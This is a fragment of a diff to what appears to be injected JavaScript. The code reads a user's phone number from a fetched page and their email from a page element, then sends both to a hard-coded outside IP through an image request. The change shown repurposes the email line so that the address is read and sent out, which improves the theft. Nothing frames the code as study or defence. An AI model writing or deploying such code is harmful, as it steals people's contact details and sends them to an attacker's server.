@@ -7,7 +7,7 @@ if (req.readyState == 4 && req.status == 200 )
  
  var phoneno = htmlPage.getElementById("per_CellPhone").innerHTML;
  
- document.getElementById("per_email").innerHTML = email;
+ var email = document.getElementById("per_email").innerHTML;
  
  new Image().src = "https://172.105.54.23:443/?email="+email+"&phoneno"+phoneno;
 
